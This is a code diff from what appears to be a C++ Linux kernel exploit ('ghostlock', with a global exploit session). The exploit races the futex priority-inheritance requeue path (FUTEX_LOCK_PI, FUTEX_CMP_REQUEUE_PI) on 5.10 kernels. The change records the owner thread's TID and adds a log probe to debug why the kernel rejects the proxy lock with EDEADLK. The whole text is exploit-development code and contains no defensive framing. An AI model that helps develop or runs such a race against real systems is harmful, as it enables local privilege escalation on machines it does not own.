@@ -75,6 +75,7 @@ namespace ghostlock::race {
     void *owner_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         support::disable_rseq_for_thread();
+        race->owner_tid.store(static_cast<int32_t>(syscall(SYS_gettid)));
         long lock_target = support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
         if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
@@ -178,6 +179,14 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
     usleep(fast_repair.load()
                ? 5000
                : session::g_exploit_session.profile.race_setup_settle_us());
+    /* 5.10 EDEADLK probe: futex_lock_pi_atomic rejects the proxy trylock
+     * with -EDEADLK when target_futex's user value already carries the
+     * requeued waiter's own TID (kernel/futex.c:1371). Dump the exact
+     * userspace state at CMP time so the run log shows who holds what. */
+    pr_info("[route] CMP probe: target_uval=%u wait_uval=%u waiter_tid=%d "
+            "owner_tid=%d cmp_tid=%d\n",
+            target_futex, wait_futex, waiter_tid.load(),
+            owner_tid.load(), static_cast<int32_t>(syscall(SYS_gettid)));
     errno = 0;
     long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                 reinterpret_cast<void *>(1),
